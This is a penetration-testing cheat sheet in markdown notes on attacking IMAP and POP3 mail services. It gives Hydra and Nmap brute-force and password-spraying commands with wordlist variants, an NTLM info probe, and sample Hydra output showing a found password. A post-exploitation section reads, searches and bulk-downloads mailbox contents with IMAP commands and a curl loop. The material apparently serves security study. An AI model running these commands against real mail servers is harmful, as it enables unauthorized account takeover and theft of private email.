---
id: Exploitation
aliases: []
tags:
  - Networking/Services/IMAP-POP3/Exploitation
links: ""
---

<!-- Exploitation {{{-->
# Exploitation

Exploit IMAP/S and POP3 services

___

<!-- IMAP {{{-->
## IMAP

<!-- Authentication {{{-->
### Authentication

<!-- Anonymous Login {{{-->
#### Anonymous Login

Anonymous Simple Authentication
(*[RFC 4505](https://www.rfc-editor.org/rfc/rfc4505)*)

```sh
a1 LOGIN "" ""
```

<!-- }}} -->

<!-- Brute Force {{{-->
#### Brute Force

[[Brute Force/General#Dictionary Attack|Dictionary Attack]]
against IMAP/S server credentials

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
> - [[Rockyou#Wordlist|Rockyou]]
>
<!-- }}} -->

[[Nmap]]

<!-- Info {{{-->
> [!info]-
>
> [imap-brute](https://nmap.org/nsedoc/scripts/imap-brute.html)
> performs brute force password auditing against IMAP servers
> using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5
> or [[NTLM]] authentication
>
<!-- }}} -->

```sh
nmap $target -p 143,993 --script imap-brute -oA imap-brute
```

```sh
nmap -sV $target -p <port> --script imap-brute -oA imap-brute-version
```

[[Hydra]]

IMAPS (*SSL/TLS*)

```sh
hydra -I -S -l <user> -P <passwords.txt> -f $target imap -s 993 -v
```

<!-- Info {{{-->
> [!info]-
>
> - `-f`: Target IP
> - `-I`: Ignore an existing restore file
>         (*don't wait 10 seconds*)
> - `-l`: Target username
> - `-P`: Password list
> - `-s`: Port
> - `-S`: Connect via SSL
> - `-v`: Verbose mode
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> Rockyou
>
> ```sh
> hydra -I -S \
>   -l <user> \
>   -P /usr/share/wordlists/rockyou.txt
>   -f $target \
>   imap -s 993 \
>   -v
> ```
>
> xato-net-10-million-passwords
>
> ```sh
> hydra -I -S \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10.txt \
>   -f $target \
>   imap -s 993 \
>   -v
> ```
> ```sh
> hydra -I -S \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt \
>   -f $target \
>   imap -s 993 \
>   -v
> ```
> ```sh
> hydra -I -S \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
>   -f $target \
>   imap -s 993 \
>   -v
> ```
> ```sh
> hydra -I -S \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt \
>   -f $target \
>   imap -s 993 \
>   -v
> ```
> ```sh
> hydra -I -S \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt \
>   -f $target \
>   imap -s 993 \
>   -v
> ```
> ```sh
> hydra -I -S \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt \
>   -f $target \
>   imap -s 993 \
>   -v
> ```
> ```sh
> hydra -I -S \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt \
>   -f $target \
>   imap -s 993 \
>   -v
> ```
<!-- }}} -->

IMAP (*plaintext*)

```sh
hydra -I -l <user> -P <passwords.txt> -f $target imap -v
```

<!-- Info {{{-->
> [!info]-
>
> - `-f`: Target IP
> - `-I`: Ignore an existing restore file
>         (*don't wait 10 seconds*)
> - `-l`: Target username
> - `-P`: Password list
> - `-v`: Verbose mode
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> Rockyou
>
> ```sh
> hydra -I \
>   -l <user> \
>   -P /usr/share/wordlists/rockyou.txt \
>   -f $target \
>   imap -v
> ```
>
> SecLists
>
> ```sh
> hydra -I \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10.txt \
>   -f $target \
>   imap -v
> ```
> ```sh
> hydra -I \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt \
>   -f $target \
>   imap -v
> ```
> ```sh
> hydra -I \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
>   -f $target \
>   imap -v
> ```
> ```sh
> hydra -I \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt \
>   -f $target \
>   imap -v
> ```
> ```sh
> hydra -I \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt \
>   -f $target \
>   imap -v
> ```
> ```sh
> hydra -I \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt \
>   -f $target \
>   imap -v
> ```
> ```sh
> hydra -I \
>   -l <user> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt \
>   -f $target \
>   imap -v
> ```
<!-- }}} -->

Multiple users

```sh
hydra -I -L <users.txt> -P <passwords.txt> imap://$target
```

<!-- Info {{{-->
> [!info]-
>
> - `-I`: Ignore an existing restore file
>         (*don't wait 10 seconds*)
> - `-L`: Username list
> - `-P`: Password list
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> Rockyou
>
> ```sh
> hydra -I \
>   -L <users.txt> \
>   -P /usr/share/wordlists/rockyou.txt \
>   imap://$target
> ```
>
> xato-net-10-million-passwords
>
> ```sh
> hydra -I \
>   -L <users.txt> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10.txt \
>   imap://$target
> ```
> ```sh
> hydra -I \
>   -L <users.txt> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt \
>   imap://$target
> ```
> ```sh
> hydra -I \
>   -L <users.txt> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
>   imap://$target
> ```
> ```sh
> hydra -I \
>   -L <users.txt> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt \
>   imap://$target
> ```
> ```sh
> hydra -I \
>   -L <users.txt> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt \
>   imap://$target
> ```
> ```sh
> hydra -I \
>   -L <users.txt> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt \
>   imap://$target
> ```
> ```sh
> hydra -I \
>   -L <users.txt> \
>   -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt \
>   imap://$target
> ```
>
<!-- }}} -->

<!-- }}} -->

<!-- Password Spraying {{{-->
#### Password Spraying

[[Brute Force/General#Password Spraying|Password Spraying]]
IMAP/S Login

<!-- Tip {{{-->
> [!tip]- Wordlists
>
> Usernames
>
> - [[Seclists#Usernames|Seclists]]
> - [[Wordlists/Metasploit#Usernames|Metasploit]]
>
<!-- }}} -->

[[Hydra]]

IMAPS (*SSL/TLS*)

```sh
hydra -I -S -L <users.txt> -p <password> -f $target imap -s 993 -v
```

<!-- Info {{{-->
> [!info]-
>
> - `-f`: Target IP
> - `-I`: Ignore an existing restore file
>         (*don't wait 10 seconds*)
> - `-L`: Username list
> - `-P`: Password list
> - `-s`: Port
> - `-S`: Connect via SSL
> - `-v`: Verbose mode
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> SecLists
>
> ```sh
> hydra -I -S \
>   -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
>   -p <password> \
>   -f $target \
>   -s 993 \
>   imap -v
> ```
> ```sh
> hydra -I -S \
>   -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
>   -p <password> \
>   -f $target \
>   -s 993 \
>   imap -v
> ```
> ```sh
> hydra -I -S \
>   -L /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt \
>   -p <password> \
>   -f $target \
>   -s 993 \
>   imap -v
> ```
> ```sh
> hydra -I -S \
>   -L /usr/share/seclists/Usernames/Names/names.txt \
>   -p <password> \
>   -f $target \
>   -s 993 \
>   imap -v
> ```
>
> Metasploit
>
> ```sh
> hydra -I -S \
>   -L /usr/share/wordlists/metasploit/unix_users.txt \
>   -p <password> \
>   -f $target \
>   -s 993 \
>   imap -v
> ```
<!-- }}} -->

IMAP (*plaintext*)

```sh
hydra -I -L <users.txt> -p <password> -f $target imap -v
```

<!-- Info {{{-->
> [!info]-
>
> - `-f`: Target IP
> - `-I`: Ignore an existing restore file
>         (*don't wait 10 seconds*)
> - `-L`: Username list
> - `-p`: Target password
> - `-v`: Verbose mode
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> SecLists
>
> ```sh
> hydra -I \
>   -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
>   -p <password> \
>   -f $target \
>   imap -v
> ```
> ```sh
> hydra -I \
>   -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
>   -p <password> \
>   -f $target \
>   imap -v
> ```
> ```sh
> hydra -I \
>   -L /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt \
>   -p <password> \
>   -f $target \
>   imap -v
> ```
> ```sh
> hydra -I \
>   -L /usr/share/seclists/Usernames/Names/names.txt \
>   -p <password> \
>   -f $target \
>   imap -v
> ```
>
> Metasploit
>
> ```sh
> hydra -I \
>   -L /usr/share/wordlists/metasploit/unix_users.txt \
>   -p <password> \
>   -f $target \
>   imap -v
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Pass-the-Hash {{{-->
#### Pass-the-Hash

Exploit [[NTLM]] authentication to use password hashes instead of plaintext
passwords

[[Nmap]] â€” Check if NTLM auth is supported

<!-- Info {{{-->
> [!info]-
>
> [imap-ntlm-info](https://nmap.org/nsedoc/scripts/imap-ntlm-info.html)
> enumerates information from remote IMAP services
> with NTLM authentication enabled
>
> Sending an IMAP NTLM authentication request with null credentials
> will cause the remote service to respond with a NTLMSSP message
> disclosing information to include NetBIOS, DNS, and OS build version
>
<!-- }}} -->

```sh
nmap $target -p 143 --script imap-ntlm-info -oA imap-script-ntlm-info
```

<!-- }}} -->

___
<!-- }}} -->

<!-- IMAP Injection {{{-->
### IMAP Injection

[IMAP injection attacks](https://hackviser.com/tactics/pentesting/services/imap#imap-injection)
involve injecting malicious commands or data into IMAP requests
to exploit vulnerabilities in the server software
or gain unauthorized access to email accounts.

___
<!-- }}} -->

<!-- Man-in-the-Middle {{{-->
### Man-in-the-Middle

[MitM attacks](https://hackviser.com/tactics/pentesting/services/imap#man-in-the-middle-mitm-attacks)
on IMAP traffic can intercept and modify email messages
exchanged between the client and server,
compromising the confidentiality and integrity
of email communication.

___
<!-- }}} -->

<!-- }}} -->

<!-- POP3 {{{-->
## POP3

<!-- Brute Force {{{-->
### Brute Force

Brute force POP3 login credentials

<!-- Wordlist {{{-->
> [!tip]- Wordlist
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> - [[Pentest/Tools/Metasploit/Metasploit#Usernames|Metasploit]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
> - [[Rockyou#Wordlist|Rockyou]]
>
<!-- }}} -->

[[Nmap]]

```sh
nmap $target -p 110 --script pop3-brute --script-args userdb=users.txt,passdb=pass.txt -oA pop3-brute
```

[[Hydra]]

```sh
hydra -l <user> -P <passwords.txt> -f $target pop3 -V
```

```sh
hydra -L <users.txt> -P <passwords.txt> -f $target pop3 -V
```

```sh
hydra -l <user> -P <passwords.txt> pop3://$target
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
> ```
> ```sh
> Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
>
> Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
> [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
> [DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
> [DATA] attacking pop3://10.10.110.20:110/
> [110][pop3] host: 10.129.42.197   login: john   password: Company01!
> 1 of 1 target successfully completed, 1 valid password found
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- IMAP {{{-->
## IMAP

<!-- Email Extraction {{{-->
### Email Extraction

Extract emails and sensitive information from compromised IMAP accounts

Read all emails

```sh
a1 LOGIN <username> <password>
```

```sh
a2 SELECT INBOX
```

```sh
a3 FETCH 1:* (BODY[])
```

Search for specific content

```sh
a4 SEARCH SUBJECT "password"
```
```sh
a5 SEARCH FROM "admin@target.com"
```
```sh
a6 SEARCH TEXT "confidential"
```

Download all emails

```sh
for i in {1..100}; do
  curl -u <username>:<password> "imap://$target/INBOX;UID=$i" > email_$i.eml
done
```

___

<!-- }}} -->

<!-- Sensitive Information {{{-->
### Sensitive Information

Search for [[Secrets]] and other sensitive information in the email content

Search for keywords

```sh
SEARCH TEXT "user"
```

```sh
SEARCH TEXT "password"
```

```sh
SEARCH TEXT "credential"
```

```sh
SEARCH TEXT "confidential"
```

```sh
SEARCH SUBJECT "reset"
```

Search by date

```sh
SEARCH SINCE 01-Jan-2024
```

Combined search

```sh
SEARCH FROM "admin" SUBJECT "password"
```

___

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
